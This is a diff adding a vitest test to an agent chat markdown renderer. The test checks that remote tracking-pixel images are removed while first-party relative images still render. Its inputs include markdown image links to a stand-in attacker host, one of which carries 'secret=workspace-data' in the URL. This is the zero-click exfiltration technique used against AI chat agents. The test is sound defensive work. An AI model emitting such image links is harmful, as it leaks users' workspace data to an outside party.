@@ -4,6 +4,26 @@ import { describe, expect, it } from 'vitest';
 import { observeAgentMarkdownTables, renderAgentMarkdown } from './agent-chat-markdown';
 
 describe('agent chat markdown tables', () => {
+	it('blocks zero-click remote images while preserving first-party relative images', () => {
+		const remote = renderAgentMarkdown(
+			'![tracking pixel](https://attacker.example/collect?secret=workspace-data)'
+		);
+		const protocolRelative = renderAgentMarkdown(
+			'![tracking pixel](//attacker.example/collect)'
+		);
+		const firstParty = renderAgentMarkdown(
+			'![uploaded image](/api/onto/assets/11111111-1111-4111-8111-111111111111/render)'
+		);
+
+		expect(remote).not.toContain('<img');
+		expect(remote).not.toContain('attacker.example');
+		expect(protocolRelative).not.toContain('<img');
+		expect(protocolRelative).not.toContain('attacker.example');
+		expect(firstParty).toContain(
+			'<img src="/api/onto/assets/11111111-1111-4111-8111-111111111111/render" alt="uploaded image"'
+		);
+	});
+
 	it('wraps sanitized tables in a dedicated scroll region with a visual cue', () => {
 		const html = renderAgentMarkdown(`| Metric | Count |
 | --- | ---: |
